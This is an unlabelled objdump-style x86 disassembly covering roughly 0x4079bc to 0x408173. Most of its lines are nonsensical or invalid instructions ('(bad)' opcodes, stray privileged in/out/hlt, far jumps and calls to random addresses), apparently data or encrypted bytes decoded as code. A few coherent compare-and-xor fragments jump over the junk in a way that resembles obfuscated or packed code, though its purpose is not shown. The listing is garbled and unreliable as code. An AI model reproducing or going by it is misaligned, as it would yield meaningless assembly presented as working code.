  4079bc:	sbb    al,0x80
  4079be:	icebp  
  4079bf:	sub    al,0x69
  4079c1:	test   eax,edi
  4079c3:	push   ecx
  4079c4:	mov    ds:0x3884c7c1,eax
  4079c9:	cs in  eax,0x7c
  4079cc:	ja     0x4079b2
  4079ce:	pop    ebp
  4079cf:	xchg   BYTE PTR [esi+0x5e],ah
  4079d2:	fmul   DWORD PTR [eax+0x19]
  4079d5:	jge    0x4079a3
  4079d7:	or     DWORD PTR [edx+0x23],esi
  4079da:	jbe    0x407964
  4079dc:	imul   ecx,DWORD PTR [ebp+0x12c68a97],0x2b3ff91d
  4079e6:	jecxz  0x407a3a
  4079e8:	leave  
  4079e9:	dec    edi
  4079ea:	ds or  cl,bl
  4079ed:	cmp    eax,ebp
  4079ef:	pop    edx
  4079f0:	out    dx,eax
  4079f1:	mov    esp,esi
  4079f3:	jnp    0x4079a7
  4079f5:	femms  
  4079f7:	ror    ecx,1
  4079f9:	std    
  4079fa:	dec    edx
  4079fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4079fc:	jno    0x4079a1
  4079fe:	pop    es
  4079ff:	or     ecx,DWORD PTR es:[bx+0x4264]
  407a05:	rcl    BYTE PTR [esi],1
  407a07:	lahf   
  407a08:	dec    ebp
  407a09:	or     DWORD PTR [esi+ebp*8+0x21],eax
  407a0d:	in     al,dx
  407a0e:	pop    esi
  407a0f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a10:	jae    0x407a2c
  407a12:	pop    es
  407a13:	mov    bh,0x58
  407a15:	retf   
  407a16:	mov    dl,0x7c
  407a18:	hlt    
  407a19:	xor    al,0x32
  407a1b:	fdiv   QWORD PTR [ecx+0x5d9d2d7f]
  407a21:	fist   DWORD PTR [esi]
  407a23:	call   0xb94bc381
  407a28:	pop    ecx
  407a29:	mov    al,ds:0x6eb755c
  407a2e:	jecxz  0x407a0f
  407a30:	jbe    0x407a9e
  407a32:	loope  0x4079dd
  407a34:	jns    0x4079b9
  407a36:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407a37:	(bad)  
  407a39:	push   ecx
  407a3a:	or     DWORD PTR [eax-0x5b],0x16
  407a3e:	jae    0x407aa3
  407a40:	cmc    
  407a41:	(bad)  
  407a42:	out    dx,al
  407a43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407a44:	out    dx,al
  407a45:	inc    ecx
  407a46:	cwde   
  407a47:	(bad)  
  407a48:	push   ecx
  407a49:	mov    bl,0x77
  407a4b:	clc    
  407a4c:	clc    
  407a4d:	cmp    al,0x9d
  407a4f:	add    DWORD PTR [ebp+0x3d5c78b8],eax
  407a55:	mov    ch,0x0
  407a57:	daa    
  407a58:	psubusw mm1,mm7
  407a5b:	cmp    DWORD PTR [esi+0x26],eax
  407a5e:	pop    ss
  407a5f:	test   DWORD PTR ds:0xeaf1093f,esp
  407a65:	or     DWORD PTR [ebx-0x68],edi
  407a68:	jmp    0x9976:0x48efb3dd
  407a6f:	inc    edx
  407a70:	cwde   
  407a71:	repnz mov edi,0x8be5f136
  407a77:	icebp  
  407a78:	or     esp,DWORD PTR [esi+0x28c7acba]
  407a7e:	stos   DWORD PTR es:[edi],eax
  407a7f:	cli    
  407a80:	repz fst DWORD PTR [ebx]
  407a83:	jg     0x407abc
  407a85:	sub    eax,0xccd98b80
  407a8a:	add    eax,0xca9c85eb
  407a8f:	and    BYTE PTR [eax],bl
  407a91:	or     eax,0x9e2e4fcc
  407a96:	cmp    DWORD PTR [ecx+eax*4],edx
  407a99:	xor    dl,al
  407a9b:	sbb    eax,0x27e9cb08
  407aa0:	mov    esi,0xd8479331
  407aa5:	cmp    al,0x6
  407aa7:	add    esp,DWORD PTR [ebx]
  407aa9:	mov    ah,0xbe
  407aab:	xor    BYTE PTR [ecx+eax*4+0x4daad967],ch
  407ab2:	sbb    eax,DWORD PTR [edx-0x30]
  407ab5:	ret    
  407ab6:	adc    ebx,eax
  407ab8:	mov    edx,DWORD PTR [esi+0x59]
  407abb:	outs   dx,DWORD PTR ds:[esi]
  407abc:	call   0x588913e1
  407ac1:	into   
  407ac2:	shl    BYTE PTR [eax+0x4],1
  407ac5:	sbb    al,0xfe
  407ac7:	mov    al,0xd7
  407ac9:	sub    eax,0xf071035c
  407ace:	retf   0x1611
  407ad1:	(bad)  
  407ad2:	std    
  407ad3:	rcr    edi,0x4
  407ad6:	popa   
  407ad7:	pusha  
  407ad8:	xchg   ebp,eax
  407ad9:	je     0x407b28
  407adb:	(bad)  
  407adc:	mov    bh,0x58
  407ade:	jmp    0x496092e3
  407ae3:	clc    
  407ae4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407ae5:	repnz sub DWORD PTR [ebx],edi
  407ae8:	in     al,dx
  407ae9:	mov    ds:0xa67065ad,al
  407aee:	scas   eax,DWORD PTR es:[edi]
  407aef:	rcr    BYTE PTR [edi+0x74a10e99],cl
  407af5:	cmp    eax,0xd25314f4
  407afa:	and    DWORD PTR [edx+esi*4+0x6a],ebp
  407afe:	sar    DWORD PTR [esi],cl
  407b00:	outs   dx,DWORD PTR ds:[esi]
  407b01:	in     al,dx
  407b02:	push   ecx
  407b03:	into   
  407b04:	or     bh,bh
  407b06:	jecxz  0x407b65
  407b08:	xlat   BYTE PTR ds:[ebx]
  407b09:	jae    0x407ad1
  407b0b:	sub    al,0xea
  407b0d:	ja     0x407ae7
  407b0f:	dec    eax
  407b10:	(bad)  
  407b11:	in     al,0x57
  407b13:	shld   DWORD PTR [ecx-0x80],ebx,0x8b
  407b18:	inc    ebp
  407b19:	or     BYTE PTR [edi],cl
  407b1b:	mov    bh,0x4
  407b1d:	nop
  407b1e:	xor    eax,0x8a40
  407b23:	add    eax,edi
  407b25:	mov    edi,DWORD PTR [ebp-0x14]
  407b28:	mov    BYTE PTR [ebp+edi*1-0x58],al
  407b2c:	mov    eax,DWORD PTR [ebp-0xc]
  407b2f:	inc    edx
  407b30:	cmp    edx,eax
  407b32:	jne    0x407679
  407b38:	pop    edi
  407b39:	pop    ebx
  407b3a:	jmp    0x407cbb
  407b3f:	fistp  QWORD PTR [edi]
  407b41:	aas    
  407b42:	or     bl,bh
  407b44:	or     ch,bl
  407b46:	jmp    0x407b0d
  407b48:	jle    0x407b96
  407b4a:	dec    ebx
  407b4b:	mov    edi,0x7de9abd0
  407b50:	lds    edi,FWORD PTR [esi+0x7e]
  407b53:	sar    BYTE PTR [edi+0x7e],cl
  407b56:	jle    0x407b42
  407b58:	jmp    0x9a77:0x62544e16
  407b5f:	int    0x7d
  407b61:	lds    esi,FWORD PTR [edx+0x46]
  407b64:	das    
  407b65:	pop    es
  407b66:	je     0x407b08
  407b68:	test   BYTE PTR [edi+0x8],ah
  407b6b:	lock xchg ebx,eax
  407b6d:	in     al,0x13
  407b6f:	test   al,0x82
  407b71:	push   eax
  407b72:	xor    ah,BYTE PTR [ebx+0x1]
  407b75:	or     DWORD PTR [eax+ebp*2-0xb],0xffffffd2
  407b7a:	outs   dx,DWORD PTR ds:[esi]
  407b7b:	dec    eax
  407b7c:	in     al,0x1f
  407b7e:	call   0xf1ee:0x10e07309
  407b85:	xchg   edi,eax
  407b86:	scas   eax,DWORD PTR es:[edi]
  407b87:	into   
  407b88:	mov    ebp,esp
  407b8a:	sub    esp,DWORD PTR [ecx]
  407b8c:	add    eax,0x5ad45182
  407b91:	add    bl,BYTE PTR [eax+ebx*8]
  407b94:	xor    eax,0x61e44b
  407b99:	outs   dx,DWORD PTR ds:[esi]
  407b9a:	sti    
  407b9b:	lds    edx,FWORD PTR [esi+ebp*1-0x57]
  407b9f:	push   ds
  407ba0:	jo     0x407b7a
  407ba2:	call   0x2300e14c
  407ba7:	(bad)  
  407ba8:	lods   eax,DWORD PTR ds:[esi]
  407ba9:	push   0x5e6b06bf
  407bae:	daa    
  407baf:	push   ebx
  407bb0:	or     DWORD PTR [edx+0x6fc70fe3],esp
  407bb6:	jecxz  0x407ba6
  407bb8:	mov    eax,ds:0x53f80b57
  407bbd:	xchg   esp,eax
  407bbe:	and    dh,BYTE PTR [esi]
  407bc0:	xor    eax,0xb9e55eb1
  407bc5:	(bad)  
  407bc6:	stos   BYTE PTR es:[edi],al
  407bc7:	add    DWORD PTR [esi-0x846ac1c],0x101a2312
  407bd1:	pop    esi
  407bd2:	sbb    al,0xe8
  407bd4:	loop   0x407bb2
  407bd6:	or     eax,0xdbdcead2
  407bdb:	std    
  407bdc:	jp     0x407c01
  407bde:	add    DWORD PTR [ecx],eax
  407be0:	cmp    ch,BYTE PTR gs:[esi-0x4d73e96c]
  407be7:	jne    0x407bef
  407be9:	mov    ecx,0x6f63603e
  407bee:	xor    dl,cl
  407bf0:	and    edx,DWORD PTR [ebx+ebp*8+0x5a42fe76]
  407bf7:	rol    DWORD PTR [esi+0x5a],0x5b
  407bfb:	adc    eax,edi
  407bfd:	xchg   ebx,eax
  407bfe:	inc    ebp
  407bff:	or     esi,ebx
  407c01:	loope  0x407c3b
  407c03:	and    al,0x11
  407c05:	cmc    
  407c06:	ins    DWORD PTR es:[edi],dx
  407c07:	retf   
  407c08:	popf   
  407c09:	cmp    esp,eax
  407c0b:	push   ds
  407c0c:	fstp   TBYTE PTR [ecx-0x75228c46]
  407c12:	or     edx,eax
  407c14:	push   ebx
  407c15:	add    esi,DWORD PTR [edi+0x1c]
  407c18:	sbb    ebp,eax
  407c1a:	ror    DWORD PTR [eax],cl
  407c1c:	pop    ebp
  407c1d:	enter  0xcfb0,0x95
  407c21:	sub    ah,0x9d
  407c24:	adc    bl,BYTE PTR [edx+0x11]
  407c27:	xchg   BYTE PTR [edi-0x194a955b],al
  407c2d:	int    0xd1
  407c2f:	jg     0x407c7d
  407c31:	je     0x407c69
  407c33:	mov    edx,0x269b6ae1
  407c39:	not    BYTE PTR [ecx+0x2b78eebe]
  407c3f:	stc    
  407c40:	(bad)  
  407c41:	jae    0x407c62
  407c43:	cwde   
  407c44:	push   ss
  407c45:	mov    ds:0xeacdf526,al
  407c4a:	jle    0x407c2b
  407c4c:	retf   
  407c4d:	adc    al,al
  407c4f:	test   al,0x92
  407c51:	pop    ebx
  407c52:	jmp    0x7ba90915
  407c57:	pop    dx
  407c59:	pushf  
  407c5a:	inc    esi
  407c5b:	dec    edx
  407c5c:	jle    0x407cbf
  407c5e:	ret    
  407c5f:	js     0x407c4b
  407c61:	dec    edx
  407c62:	mov    ebp,0x527b5814
  407c67:	fistp  WORD PTR [esi]
  407c69:	pop    edx
  407c6a:	and    eax,eax
  407c6c:	cli    
  407c6d:	sbb    al,0x55
  407c6f:	in     al,0xe4
  407c71:	and    BYTE PTR ds:0x9cc4afab,0xbf
  407c78:	or     edx,DWORD PTR [esi+0x2e0c2f7f]
  407c7e:	jne    0x407c6d
  407c80:	dec    ecx
  407c81:	lahf   
  407c82:	xor    eax,0x3315d3
  407c87:	stc    
  407c88:	test   eax,0xc81dfcd7
  407c8d:	adc    DWORD PTR ds:0x9e46cd74,edi
  407c93:	push   ds
  407c94:	dec    DWORD PTR [ecx]
  407c96:	mov    ebp,0xea6eaafb
  407c9b:	dec    esp
  407c9c:	or     BYTE PTR [edi-0xf],0x50
  407ca0:	ins    BYTE PTR es:[edi],dx
  407ca1:	sbb    bh,BYTE PTR [edi+0x0]
  407ca4:	loope  0x407cf4
  407ca6:	adc    al,0x5e
  407ca8:	xchg   ebx,eax
  407ca9:	xor    eax,0xe384821c
  407cae:	call   0xf3db:0x7e73b140
  407cb5:	mov    esi,0xd36b471e
  407cba:	sbb    al,0x8b
  407cbc:	inc    ebp
  407cbd:	clc    
  407cbe:	mov    edx,DWORD PTR [ebp+0x10]
  407cc1:	xor    eax,ecx
  407cc3:	add    eax,esi
  407cc5:	mov    DWORD PTR [edx],eax
  407cc7:	mov    eax,DWORD PTR [ebp-0x8]
  407cca:	xor    eax,ecx
  407ccc:	add    eax,esi
  407cce:	jmp    0x407e4f
  407cd3:	mov    bh,0xb6
  407cd5:	(bad)  
  407cd6:	ror    DWORD PTR [edi+0x86a7bfb],cl
  407cdc:	dec    ebx
  407cdd:	ror    DWORD PTR [edx],cl
  407cdf:	xor    al,0xb4
  407ce1:	dec    ecx
  407ce2:	mov    ecx,ss
  407ce4:	(bad)  
  407ce5:	jle    0x407d65
  407ce7:	sar    BYTE PTR [edi+0x7e],cl
  407cea:	jle    0x407cd1
  407cec:	mov    bl,0xff
  407cee:	cmp    esp,ebx
  407cf0:	sbb    BYTE PTR [esi-0xd73726],0x63
  407cf7:	mov    dh,0x18
  407cf9:	fdivr  DWORD PTR [edi+edi*1-0x33]
  407cfd:	pop    ebp
  407cfe:	scas   eax,DWORD PTR es:[edi]
  407cff:	mov    ecx,0x4375ac52
  407d04:	hlt    
  407d05:	xor    ebx,ecx
  407d07:	scas   al,BYTE PTR es:[edi]
  407d08:	in     eax,dx
  407d09:	ret    0xf23f
  407d0c:	fisubr DWORD PTR [edi]
  407d0e:	push   es
  407d0f:	xchg   esi,eax
  407d10:	mov    ?,WORD PTR [ecx]
  407d12:	mov    ah,0x9e
  407d14:	push   0x7ecc28c9
  407d19:	pop    ecx
  407d1a:	xor    DWORD PTR [eax+0x464adc7d],esi
  407d20:	sbb    ecx,0x243e036
  407d26:	mov    bl,0xc8
  407d28:	cmp    eax,0x95e95dbe
  407d2d:	sti    
  407d2e:	push   es
  407d2f:	popa   
  407d30:	mov    es,ebx
  407d32:	(bad)  
  407d33:	sub    eax,0x1471c994
  407d38:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d39:	dec    eax
  407d3a:	outs   dx,BYTE PTR ds:[esi]
  407d3b:	mov    ecx,0xe09b4031
  407d40:	js     0x407cf6
  407d42:	push   gs
  407d44:	xor    ah,bh
  407d46:	dec    ebp
  407d47:	dec    ebx
  407d48:	daa    
  407d49:	ds dec ebx
  407d4b:	jmp    0x407d8f
  407d4d:	jbe    0x407d16
  407d4f:	and    BYTE PTR [eax+0xf],cl
  407d52:	leave  
  407d53:	enter  0x301f,0xf1
  407d57:	dec    ebx
  407d58:	loopne 0x407cf4
  407d5a:	xor    dl,bl
  407d5c:	or     eax,0x132287c3
  407d61:	mov    edi,esi
  407d63:	cmp    ecx,ebx
  407d65:	lods   al,BYTE PTR ds:[esi]
  407d66:	(bad)
  407d6a:	mov    al,BYTE PTR [edi+0x6ece56ea]
  407d70:	arpl   WORD PTR [ebx+0x3d],dx
  407d73:	inc    esp
  407d74:	stc    
  407d75:	popf   
  407d76:	sahf   
  407d77:	dec    edi
  407d78:	int    0x7c
  407d7a:	inc    ebp
  407d7b:	add    ecx,edi
  407d7d:	retf   
  407d7e:	mov    esi,0x9c9d311a
  407d83:	(bad)  
  407d84:	cli    
  407d85:	das    
  407d86:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407d87:	in     eax,dx
  407d88:	fistp  QWORD PTR [ebx]
  407d8a:	clc    
  407d8b:	cs jbe 0x407d8e
  407d8e:	jne    0x407de1
  407d90:	adc    esi,DWORD PTR [ebp-0x25]
  407d93:	inc    ebx
  407d94:	sbb    al,0x5b
  407d96:	cmp    dl,BYTE PTR [esi]
  407d98:	inc    esi
  407d99:	and    DWORD PTR [ecx],eax
  407d9b:	int3   
  407d9c:	mov    esi,0x85df8772
  407da1:	xchg   edi,eax
  407da2:	ins    DWORD PTR es:[edi],dx
  407da3:	mov    ah,0x7b
  407da5:	xor    DWORD PTR [ecx-0xd997c62],ebx
  407dab:	add    ebp,DWORD PTR [ecx-0x1a6e3a45]
  407db1:	cmp    eax,0x90a7f85d
  407db6:	pop    esi
  407db7:	sti    
  407db8:	push   ds
  407db9:	sbb    ah,BYTE PTR [ecx+eax*4-0x32e93dbf]
  407dc0:	push   0xcd3f33c7
  407dc5:	fwait
  407dc6:	not    ch
  407dc8:	dec    ebp
  407dc9:	shl    DWORD PTR [ebx+0x6a5a0537],0xb8
  407dd0:	lds    ecx,FWORD PTR [ecx]
  407dd2:	pop    esp
  407dd3:	push   esp
  407dd4:	enter  0xd73d,0xcf
  407dd8:	mov    bl,0xf7
  407dda:	mov    al,0x37
  407ddc:	jmp    0x407d65
  407dde:	or     ch,BYTE PTR [ebx]
  407de0:	dec    edx
  407de1:	and    edi,DWORD PTR [edx+eiz*1]
  407de4:	aam    0x36
  407de6:	sub    DWORD PTR [ecx+0x69cd4ef1],ebx
  407dec:	cmp    eax,0xf61ddf1d
  407df1:	push   eax
  407df2:	pop    edx
  407df3:	jo     0x407dac
  407df5:	xchg   esp,eax
  407df6:	stos   BYTE PTR es:[edi],al
  407df7:	pop    ecx
  407df8:	(bad)  
  407df9:	dec    esp
  407dfa:	xor    DWORD PTR [ebx],ebx
  407dfc:	jmp    DWORD PTR [edi]
  407dfe:	mov    gs,WORD PTR [edi-0x37fd8bda]
  407e04:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e05:	ror    DWORD PTR ss:[edx-0x2d],cl
  407e09:	or     eax,0x28876289
  407e0f:	inc    eax
  407e10:	lods   al,BYTE PTR ds:[esi]
  407e11:	das    
  407e12:	loope  0x407de4
  407e14:	ret    0x15b7
  407e17:	lea    ebx,[ebx-0x3f28842d]
  407e1d:	xchg   edi,eax
  407e1e:	sub    eax,0x6d09773e
  407e23:	jmp    0xa5d2:0xeabcbedc
  407e2a:	into   
  407e2b:	dec    ecx
  407e2c:	xor    al,0x5e
  407e2e:	cmp    DWORD PTR [edx+0x5c8ad07e],esi
  407e34:	shr    BYTE PTR [esi+ebp*2],cl
  407e37:	xor    ebx,DWORD PTR [edx-0x60]
  407e3a:	out    0xcd,eax
  407e3c:	dec    esp
  407e3d:	ret    0xb5e9
  407e40:	pop    edi
  407e41:	mov    bl,0xcc
  407e43:	mov    eax,0xa847db23
  407e48:	cli    
  407e49:	or     DWORD PTR [ebp+0x3f5b8b18],ecx
  407e4f:	mov    DWORD PTR [ebp+0x8],eax
  407e52:	mov    eax,DWORD PTR [ebp+0x8]
  407e55:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e59:	mov    dl,BYTE PTR [ebp-0x1]
  407e5c:	cmp    al,dl
  407e5e:	je     0x4081a3
  407e64:	mov    eax,DWORD PTR [ebp+0x8]
  407e67:	mov    al,BYTE PTR [ebp+eax*1-0x58]
  407e6b:	mov    edx,DWORD PTR [ebp+0xc]
  407e6e:	cmp    al,BYTE PTR [edx]
  407e70:	jne    0x40834a
  407e76:	mov    eax,DWORD PTR [ebp-0x8]
  407e79:	mov    edx,DWORD PTR [ebp+0xc]
  407e7c:	movsx  edx,BYTE PTR [edx]
  407e7f:	xor    eax,ecx
  407e81:	add    eax,esi
  407e83:	cmp    edx,eax
  407e85:	je     0x40833e
  407e8b:	mov    DWORD PTR [ebp-0x18],0x705fd8f
  407e92:	lea    eax,[ebp-0x18]
  407e95:	jmp    0x408016
  407e9a:	xchg   BYTE PTR [eax],cl
  407e9c:	mov    al,ds:0xb8a6a08e
  407ea1:	or     BYTE PTR [edx],ah
  407ea3:	mov    bl,cl
  407ea5:	mov    dl,0x49
  407ea7:	push   cs
  407ea8:	mov    ebp,0x7ed8b598
  407ead:	jle    0x407e81
  407eaf:	jg     0x407f2f
  407eb1:	jle    0x407ebb
  407eb3:	test   esp,ecx
  407eb5:	imul   ebp,DWORD PTR [ebp+0x3d09088b],0xffffffcf
  407ebc:	xor    eax,DWORD PTR [edx-0x47]
  407ebf:	sub    eax,0xd35ab86f
  407ec4:	push   esi
  407ec5:	test   eax,0x9ebcb259
  407eca:	pop    eax
  407ecb:	(bad)  
  407ecc:	jae    0x407ec0
  407ece:	pop    esi
  407ecf:	movzx  esi,WORD PTR [esi+0x65]
  407ed3:	rcr    BYTE PTR [ecx+edx*4],cl
  407ed6:	loop   0x407f1f
  407ed8:	xchg   ecx,eax
  407ed9:	mov    DWORD PTR [eax-0x17],ebx
  407edc:	clc    
  407edd:	add    edi,DWORD PTR [edx-0x72]
  407ee0:	into   
  407ee1:	adc    BYTE PTR [ebx+0x6c0eca13],dh
  407ee7:	mov    al,0xd5
  407ee9:	sti    
  407eea:	cmc    
  407eeb:	dec    eax
  407eec:	cmp    eax,0x4070689a
  407ef1:	dec    esi
  407ef2:	scas   al,BYTE PTR es:[edi]
  407ef3:	pop    ecx
  407ef4:	popa   
  407ef5:	pop    ss
  407ef6:	pop    edi
  407ef7:	jbe    0x407f4a
  407ef9:	lahf   
  407efa:	and    eax,esp
  407efc:	daa    
  407efd:	fistp  WORD PTR [esi]
  407eff:	mov    esp,0x7729f29b
  407f04:	ins    BYTE PTR es:[edi],dx
  407f05:	xor    BYTE PTR [ebx-0x50],0xaf
  407f09:	(bad)  
  407f0a:	out    dx,eax
  407f0b:	out    dx,eax
  407f0c:	jne    0x407f88
  407f0e:	cwde   
  407f0f:	rcl    DWORD PTR [ebp+0x2792a490],0x51
  407f16:	adc    DWORD PTR [edx+0x4403bfbb],eax
  407f1c:	test   al,0x24
  407f1e:	xor    bh,BYTE PTR [ebx+esi*1+0x75050009]
  407f25:	ficom  WORD PTR [edx+ebx*4-0x4d]
  407f29:	xor    DWORD PTR [ebp+0x9],edi
  407f2c:	(bad)  
  407f2d:	mov    edi,0xc233238b
  407f32:	bound  esi,QWORD PTR ds:0xed11713a
  407f38:	mov    ?,WORD PTR [eax]
  407f3a:	sbb    DWORD PTR [ebp+0x13],edx
  407f3d:	nop
  407f3e:	ret    0xa340
  407f41:	sub    al,0x1e
  407f43:	neg    eax
  407f45:	mov    dh,0x1b
  407f47:	xchg   DWORD PTR [esp+edx*4],esp
  407f4a:	popf   
  407f4b:	push   ebx
  407f4c:	xchg   DWORD PTR [ebp-0x73],edx
  407f4f:	sbb    al,al
  407f51:	push   eax
  407f52:	retf   0xb134
  407f55:	jl     0x407f90
  407f57:	out    0xa3,eax
  407f59:	out    0xf4,al
  407f5b:	dec    esi
  407f5c:	jg     0x407fc1
  407f5e:	mov    dl,0xdb
  407f60:	pusha  
  407f61:	repz push esp
  407f63:	out    dx,eax
  407f64:	test   DWORD PTR [edx-0x1f],edi
  407f67:	lds    ecx,FWORD PTR [edi]
  407f69:	xor    esp,esp
  407f6b:	call   0x120751fd
  407f70:	(bad)  
  407f71:	lock and al,0xe
  407f74:	or     eax,0x563b966f
  407f79:	xchg   BYTE PTR [ecx+ecx*8],bl
  407f7c:	nop
  407f7d:	out    dx,al
  407f7e:	iret   
  407f7f:	daa    
  407f80:	mov    ch,0x79
  407f82:	(bad)  
  407f83:	xor    al,0x67
  407f85:	es adc al,0x7d
  407f88:	ror    DWORD PTR [ebx+0x27],cl
  407f8b:	mov    esi,0x66bdf196
  407f90:	mov    ebx,0x6f5abe02
  407f95:	cwde   
  407f96:	pop    esp
  407f97:	fisub  DWORD PTR [eax-0x3b8619f9]
  407f9d:	repnz lods al,BYTE PTR ds:[esi]
  407f9f:	jl     0x407f6f
  407fa1:	std    
  407fa2:	in     eax,dx
  407fa3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  407fa4:	pop    esi
  407fa5:	pusha  
  407fa6:	cmp    DWORD PTR [ebx+0x58],ecx
  407fa9:	pushf  
  407faa:	push   ss
  407fab:	jnp    0x407f3c
  407fad:	adc    BYTE PTR ds:0xb46bf625,cl
  407fb3:	adc    eax,0x85feba2
  407fb8:	shl    BYTE PTR [ebx],cl
  407fba:	div    BYTE PTR [edx-0x854baed]
  407fc0:	mov    esi,ebx
  407fc2:	std    
  407fc3:	fisttp DWORD PTR [ebx-0x4a]
  407fc6:	stos   DWORD PTR es:[edi],eax
  407fc7:	mov    ecx,0x8bc90368
  407fcc:	js     0x407fbd
  407fce:	in     eax,dx
  407fcf:	pop    ds
  407fd0:	or     bl,BYTE PTR [esi+0x7f5a2365]
  407fd6:	paddusw mm3,QWORD PTR [eax+0x75de6a0d]
  407fdd:	ins    BYTE PTR es:[edi],dx
  407fde:	sbb    al,0x2e
  407fe0:	sbb    ah,BYTE PTR [edi]
  407fe2:	mov    al,0xb0
  407fe4:	mov    dl,0x18
  407fe6:	loop   0x407ff1
  407fe8:	xor    al,0x6f
  407fea:	scas   eax,DWORD PTR es:[edi]
  407feb:	cmp    eax,0xe5393f1f
  407ff0:	pop    ebx
  407ff1:	std    
  407ff2:	jmp    0x40801c
  407ff4:	pop    eax
  407ff5:	sbb    dh,BYTE PTR [ebx+0x1a]
  407ff8:	mov    ebp,0xaeb213f9
  407ffd:	test   BYTE PTR [edx+0x7b],0x2e
  408001:	sub    BYTE PTR [esi],0xd5
  408004:	rol    BYTE PTR [ebp+0x2884dde],cl
  40800a:	push   ebx
  40800b:	inc    ecx
  40800c:	pop    es
  40800d:	xchg   ebx,eax
  40800e:	pop    ebx
  40800f:	mov    DWORD PTR [esi+ebp*2+0x1a],esi
  408013:	pop    es
  408014:	jg     0x8c2cc5a3
  40801a:	inc    ebp
  40801b:	in     al,dx
  40801c:	add    DWORD PTR [eax],0x705fa8f
  408022:	jmp    0x4081a3
  408027:	test   al,0x70
  408029:	cmp    ch,BYTE PTR [ecx-0x46]
  40802c:	jge    0x4080ab
  40802e:	xor    DWORD PTR [edx-0x4f],eax
  408031:	imul   esi,DWORD PTR [edx-0x8887f98],0x7e7eda29
  40803b:	sar    BYTE PTR [edi+0x7e],cl
  40803e:	jle    0x407fd3
  408040:	shl    ebp,0x21
  408043:	nop
  408044:	push   edx
  408045:	sbb    al,0xf8
  408047:	jge    0x408001
  408049:	mov    DWORD PTR [ebx],edx
  40804b:	mov    eax,ds:0x9dc4da0a
  408050:	jno    0x4080bc
  408052:	xchg   edi,eax
  408053:	into   
  408054:	movs   BYTE PTR es:[di],BYTE PTR ds:[si]
  408056:	xor    BYTE PTR [esi+0x114e31e0],0x58
  40805d:	xlat   BYTE PTR ds:[ebx]
  40805e:	add    DWORD PTR [ebx],0x67b2a692
  408064:	inc    edx
  408065:	mov    edi,0x3289049d
  40806a:	xor    al,0xda
  40806c:	inc    edx
  40806d:	adc    BYTE PTR [esi+0x58],bl
  408070:	xlat   BYTE PTR ds:[ebx]
  408071:	jns    0x40802d
  408073:	imul   ebp,DWORD PTR [edx+0x6d7b380d],0xb48a7bce
  40807d:	and    cl,BYTE PTR [edx]
  40807f:	pop    ebp
  408080:	and    edi,DWORD PTR [esi-0x6a935318]
  408086:	retf   
  408087:	cmp    eax,0x1bb65bb1
  40808c:	int    0xc3
  40808e:	sub    edi,DWORD PTR [ecx]
  408090:	test   BYTE PTR [ecx],0xea
  408093:	pop    ds
  408094:	std    
  408095:	mov    ecx,0x6d345122
  40809a:	rol    DWORD PTR [edx+eax*8+0x673f640f],1
  4080a1:	add    al,0x8b
  4080a3:	test   BYTE PTR cs:[ebx-0x11c717b2],ah
  4080aa:	jnp    0x4080c7
  4080ac:	mov    dh,0x61
  4080ae:	data16 pushw ds
  4080b1:	jmp    0x5ca7:0xbd47bd8
  4080b8:	jmp    0x4080ac
  4080ba:	mov    ds:0x187e12a8,eax
  4080bf:	jecxz  0x408105
  4080c1:	cld    
  4080c2:	add    ch,BYTE PTR [esp+eax*2-0x2fa1253c]
  4080c9:	fwait
  4080ca:	and    BYTE PTR [ecx],al
  4080cc:	leave  
  4080cd:	add    al,ch
  4080cf:	xor    dh,BYTE PTR [ebx-0x16]
  4080d2:	mov    bl,0xe6
  4080d4:	or     eax,0xac3c0d70
  4080d9:	add    eax,0x93fbc20d
  4080de:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4080e0:	mov    bl,0xdb
  4080e2:	jbe    0x4080e9
  4080e4:	aad    0x17
  4080e6:	sar    BYTE PTR [ebx-0x3b],cl
  4080e9:	pop    esp
  4080ea:	out    dx,al
  4080eb:	dec    ebx
  4080ec:	sub    al,0xe1
  4080ef:	test   al,0xe8
  4080f1:	iret   
  4080f2:	dec    esp
  4080f3:	loopne 0x4080f6
  4080f5:	inc    edi
  4080f6:	shl    BYTE PTR [edx+0x30],1
  4080f9:	sbb    DWORD PTR [edi],ebx
  4080fb:	dec    eax
  4080fc:	dec    esp
  4080fd:	sub    BYTE PTR [ebx+ecx*1+0xb],bl
  408101:	jo     0x4080aa
  408103:	dec    esp
  408104:	xor    eax,0x4e8b9c1f
  408109:	sub    al,0x3e
  40810b:	add    al,0xe6
  40810d:	pop    es
  40810e:	mov    eax,0xae2edeb4
  408113:	mov    ebp,esp
  408115:	adc    DWORD PTR [esi+eax*4],esi
  408118:	not    BYTE PTR fs:[ebp+0x17e39d28]
  40811f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408120:	jnp    0x408107
  408122:	out    0xa3,al
  408124:	cmp    dl,BYTE PTR [ebx]
  408126:	mov    dl,0x70
  408128:	nop
  408129:	inc    edi
  40812a:	test   BYTE PTR [esi+eax*1+0x72],bh
  40812e:	idiv   esi
  408130:	fld    DWORD PTR [edi+0x6c]
  408133:	lahf   
  408134:	fadd   QWORD PTR [edx+0x13]
  408137:	xchg   esp,eax
  408138:	jne    0x40813a
  40813a:	adc    BYTE PTR [ebp-0x476dbaf9],ah
  408140:	stc    
  408141:	mov    BYTE PTR [edx+0x2ad62235],0xa5
  408148:	xchg   ebx,eax
  408149:	pop    edx
  40814a:	(bad)  
  40814b:	mov    ebx,0xc0ee5ee9
  408150:	sbb    DWORD PTR [edx],edx
  408152:	dec    edx
  408153:	xor    BYTE PTR [edi+esi*4],bl
  408156:	dec    edx
  408157:	ror    DWORD PTR [esi+ebx*8-0x4b725905],cl
  40815e:	int3   
  40815f:	nop
  408160:	and    bh,cl
  408162:	push   edi
  408163:	sar    BYTE PTR [edx-0x6662ea61],1
  408169:	nop
  40816a:	cmp    bh,bl
  40816c:	add    DWORD PTR [eax+0x1a7841bd],esi
  408172:	in     al,dx
  408173:	push   ecx
